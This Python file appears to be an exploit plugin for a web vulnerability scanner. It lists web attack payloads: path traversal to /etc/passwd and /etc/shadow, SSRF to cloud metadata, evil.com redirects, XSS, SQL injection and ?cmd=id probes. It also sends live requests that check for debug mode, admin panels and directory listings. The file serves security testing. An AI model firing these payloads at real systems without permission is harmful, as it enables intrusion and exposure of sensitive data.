"""
Generic Vulnerability Exploit Plugin

This plugin provides exploit capabilities for miscellaneous vulnerabilities.
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_mutator import PayloadMutator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from scanner.visual_proof_capture import VisualProofCapture
    from scanner.media_manager import MediaManager
    HAS_VISUAL_PROOF = True
except ImportError:
    HAS_VISUAL_PROOF = False
    logging.warning("Visual proof modules not available")

logger = logging.getLogger(__name__)


class OtherPlugin(ExploitPlugin):
    """Generic vulnerability exploit plugin."""
    
    @property
    def vulnerability_type(self) -> str:
        return 'other'
    
    @property
    def name(self) -> str:
        return 'Generic Vulnerability Exploit'
    
    @property
    def description(self) -> str:
        return 'Exploits miscellaneous vulnerability types.'
    
    @property
    def version(self) -> str:
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate generic payloads."""
        payloads = [
            '?debug=true', '?test=1', '?admin=true', '?debug=1', '?debug=on',
            '?trace=1', '?verbose=1', '?env=dev', '?env=development', '?mode=debug',
            '?XDEBUG_SESSION_START=1', '?php_info=1', '?phpinfo=1', '?info=1',
            '?id=1', '?id=0', '?id=-1',
            '?page=../etc/passwd', '?file=../etc/passwd',
            '?include=../etc/passwd', '?path=../etc/passwd',
            '?url=http://169.254.169.254/',
            # Extra generic security probes
            '?debug=2', '?debug=3', '?debug=yes', '?debug=TRUE',
            '?test=true', '?test=yes', '?test=on',
            '?admin=1', '?admin=yes', '?admin=on',
            '?superuser=1', '?superuser=true', '?root=1',
            '?trace=true', '?trace=yes', '?trace=on',
            '?verbose=true', '?verbose=yes', '?verbose=on',
            '?mode=test', '?mode=development', '?mode=staging',
            '?mode=debug&debug=true', '?env=test', '?env=staging',
            '?env=local', '?env=prod', '?env=production',
            '?phpinfo=1&debug=1', '?info=phpinfo', '?show_errors=1',
            '?display_errors=1', '?error_reporting=1',
            '?XDEBUG_SESSION=PHPSTORM', '?XDEBUG_SESSION=1',
            '?xdebug=1', '?xdebug_session_start=1',
            '?profiler=1', '?profiling=1', '?profile=1',
            '?sql_debug=1', '?query_debug=1', '?db_debug=1',
            '?log=1', '?logging=1', '?show_log=1',
            '?dev=1', '?developer=1', '?devel=1',
            '?internal=1', '?private=1', '?secret=1',
            '?key=', '?api_key=', '?token=', '?access_token=',
            '?auth=', '?password=', '?pass=', '?pwd=',
            '?username=admin', '?user=admin', '?login=admin',
            '?id=../etc/passwd', '?id=../../etc/passwd',
            '?page=../../etc/passwd', '?page=/etc/passwd',
            '?file=/etc/passwd', '?file=../../etc/shadow',
            '?include=/etc/passwd', '?require=/etc/passwd',
            '?load=/etc/passwd', '?read=/etc/passwd',
            '?path=/etc/passwd', '?dir=/etc',
            '?url=http://127.0.0.1/', '?url=http://localhost/',
            '?url=http://169.254.169.254/latest/meta-data/',
            '?url=file:///etc/passwd', '?url=dict://localhost:11211/',
            '?redirect=http://evil.com', '?next=http://evil.com',
            '?return=http://evil.com', '?dest=http://evil.com',
            '?callback=alert(1)', '?jsonp=alert(1)',
            '?q=<script>alert(1)</script>',
            '?search=<script>alert(1)</script>',
            '?name=<img src=x onerror=alert(1)>',
            '?input=\' OR \'1\'=\'1', '?q=\' OR 1=1--',
            '?cmd=id', '?exec=id', '?command=id',
            '?cat=../etc/passwd', '?open=../etc/passwd',
            '?lang=../../etc/passwd', '?template=../../etc/passwd',
            '?view=../../etc/passwd', '?theme=../../etc/passwd',
            '?layout=../../etc/passwd', '?base=../../etc/passwd',
            '?action=delete&id=1', '?action=admin&id=1',
            '?op=delete', '?op=admin', '?op=edit&id=1',
            '?method=delete', '?method=admin',
            '?format=json', '?format=xml', '?format=yaml',
            '?type=admin', '?type=debug', '?type=test',
            '?output=debug', '?output=json', '?output=xml',
            '?callback=stealData&token=', '?format=jsonp',
        ]
        # Generate more diverse probe payloads
        dynamic_other = []
        for param in ['debug', 'test', 'admin', 'dev', 'trace', 'verbose', 'internal']:
            for val in ['true', 'false', '1', '0', 'yes', 'no', 'on', 'off', 'enable', 'disable']:
                dynamic_other.append(f'?{param}={val}')
        for env in ['dev', 'development', 'test', 'testing', 'staging', 'stage', 'qa', 'prod', 'production', 'local']:
            dynamic_other.append(f'?env={env}')
            dynamic_other.append(f'?environment={env}')
        for path in ['../etc/passwd', '../../etc/passwd', '../../../etc/passwd',
                     '../../../../etc/passwd', '../etc/shadow', '../../etc/shadow']:
            for param in ['file', 'path', 'page', 'include', 'load', 'read', 'dir', 'template', 'view', 'base']:
                dynamic_other.append(f'?{param}={path}')
        payloads.extend(dynamic_other)
        return PayloadMutator.scale_payloads_to_minimum(payloads)
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute generic exploit with visual proof capture."""
        if not HAS_REQUESTS:
            return {'success': False, 'error': 'Requests not available', 'vulnerability_type': 'other'}
        
        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        
        # Test various generic vulnerabilities
        vulnerabilities_found = []
        
        # Test 1: Debug mode enabled
        try:
            response = requests.get(target_url + '?debug=true', timeout=timeout, verify=verify_ssl)
            if any(indicator in response.text.lower() for indicator in ['debug', 'traceback', 'stack trace', 'exception']):
                vulnerabilities_found.append({
                    'type': 'debug_mode',
                    'evidence': 'Debug mode accessible',
                    'payload': '?debug=true',
                    'description': 'Debug mode exposes sensitive information'
                })
                logger.info("Debug mode vulnerability detected")
        except Exception as e:
            logger.debug(f"Error testing debug mode: {e}")
        
        # Test 2: Admin panel exposure
        admin_paths = ['/admin', '/admin/', '/administrator', '/wp-admin', '/phpmyadmin']
        for path in admin_paths:
            try:
                response = requests.get(target_url.rstrip('/') + path, timeout=timeout, verify=verify_ssl)
                if response.status_code == 200 and any(indicator in response.text.lower() for indicator in ['login', 'admin', 'password', 'username']):
                    vulnerabilities_found.append({
                        'type': 'exposed_admin',
                        'evidence': f'Admin panel accessible at {path}',
                        'payload': path,
                        'description': f'Exposed admin panel at {path}'
                    })
                    logger.info(f"Exposed admin panel found at {path}")
                    break
            except Exception as e:
                logger.debug(f"Error testing {path}: {e}")
        
        # Test 3: Directory listing
        try:
            response = requests.get(target_url, timeout=timeout, verify=verify_ssl)
            if 'Index of' in response.text or 'Directory listing' in response.text:
                vulnerabilities_found.append({
                    'type': 'directory_listing',
                    'evidence': 'Directory listing enabled',
                    'payload': '/',
                    'description': 'Directory listing exposes file structure'
                })
                logger.info("Directory listing vulnerability detected")
        except Exception as e:
            logger.debug(f"Error testing directory listing: {e}")
        
        # Test 4: Verbose error messages
        try:
            response = requests.get(target_url + '/nonexistent', timeout=timeout, verify=verify_ssl)
            if any(indicator in response.text.lower() for indicator in ['php error', 'mysql error', 'sql syntax', 'fatal error', 'warning:', 'notice:']):
                vulnerabilities_found.append({
                    'type': 'verbose_errors',
                    'evidence': 'Verbose error messages exposed',
                    'payload': '/nonexistent',
                    'description': 'Verbose error messages reveal sensitive information'
                })
                logger.info("Verbose error messages detected")
        except Exception as e:
            logger.debug(f"Error testing verbose errors: {e}")
        
        if vulnerabilities_found:
            primary_vuln = vulnerabilities_found[0]
            result = {
                'success': True,
                'evidence': primary_vuln['evidence'],
                'vulnerability_type': 'other',
                'message': 'Generic vulnerability confirmed',
                'vulnerabilities': vulnerabilities_found,
                'vulnerability_subtype': primary_vuln['type'],
            }
            
            # Capture visual proof if available
            if HAS_VISUAL_PROOF and config.get('capture_visual_proof', True):
                visual_proofs = self._capture_visual_proof(
                    target_url, vulnerabilities_found, config
                )
                if visual_proofs:
                    result['visual_proofs'] = visual_proofs
                    logger.info(f"Captured {len(visual_proofs)} visual proof(s)")
            
            return result
        
        return {'success': False, 'error': 'Could not exploit', 'vulnerability_type': 'other'}
    
    def _capture_visual_proof(self, url: str, vulnerabilities: List[Dict[str, Any]],
                              config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Capture visual proof of generic vulnerability exploitation.
        
        Args:
            url: Target URL
            vulnerabilities: List of detected vulnerabilities
            config: Configuration dictionary
            
        Returns:
            List of visual proof metadata dictionaries
        """
        visual_proofs = []
        
        try:
            proof_capture = VisualProofCapture()
            
            # Capture screenshots for each vulnerability found
            for vuln in vulnerabilities[:3]:  # Limit to first 3
                vuln_type = vuln['type']
                payload = vuln['payload']
                description = vuln['description']
                
                # Build proof URL
                if payload.startswith('?'):
                    proof_url = url + payload
                elif payload.startswith('/'):
                    proof_url = url.rstrip('/') + payload
                else:
                    proof_url = url
                
                # Set appropriate title based on vulnerability type
                titles = {
                    'debug_mode': 'Generic Vulnerability - Debug Mode Enabled',
                    'exposed_admin': 'Generic Vulnerability - Exposed Admin Panel',
                    'directory_listing': 'Generic Vulnerability - Directory Listing',
                    'verbose_errors': 'Generic Vulnerability - Verbose Error Messages',
                }
                
                title = titles.get(vuln_type, 'Generic Vulnerability Detected')
                
                screenshot_data = proof_capture.capture_screenshot(
                    proof_url,
                    wait_time=2.0
                )
                
                if screenshot_data:
                    visual_proofs.append({
                        'type': 'screenshot',
                        'data': screenshot_data,
                        'title': title,
                        'description': description,
                        'exploit_step': f'Vulnerability exposed via: {payload}',
                        'payload': payload,
                        'vulnerability_subtype': vuln_type
                    })
            
            # If we found debug mode, try to capture a stack trace view
            if any(v['type'] == 'debug_mode' for v in vulnerabilities):
                error_url = url + '?debug=true&error=1'
                screenshot_data = proof_capture.capture_screenshot(
                    error_url,
                    wait_time=1.5
                )
                
                if screenshot_data:
                    visual_proofs.append({
                        'type': 'screenshot',
                        'data': screenshot_data,
                        'title': 'Debug Mode - Stack Trace Exposure',
                        'description': 'Debug mode exposes detailed error information and stack traces',
                        'exploit_step': 'Triggered error to expose stack trace',
                        'payload': '?debug=true&error=1'
                    })
            
        except Exception as e:
            logger.error(f"Failed to capture visual proof: {e}")
        
        return visual_proofs
    
    def verify(self, result: Dict[str, Any], 
               target_url: str,
               vulnerability_data: Dict[str, Any]) -> tuple:
        """Verify generic vulnerability exploitation."""
        if not result.get('success'):
            return False, None
        
        evidence = result.get('evidence', '')
        
        # For generic/other vulnerabilities, rely on the base class default verification
        # which checks for evidence and extracted data
        if evidence and len(evidence) > 20:
            proof = f"âœ“ VERIFIED - Vulnerability Exploited\n\nEvidence: {evidence[:300]}\n\nImpact: Security vulnerability confirmed"
            return True, proof
        
        return False, None
    
    def get_severity_level(self) -> str:
        return 'medium'
    
    def get_remediation_advice(self) -> str:
        return (
            'Prevent miscellaneous vulnerabilities:\n'
            '1. Follow secure coding practices\n'
            '2. Implement proper access controls\n'
            '3. Use security headers\n'
            '4. Keep software updated\n'
            '5. Conduct security audits\n'
            '6. Implement defense in depth'
        )
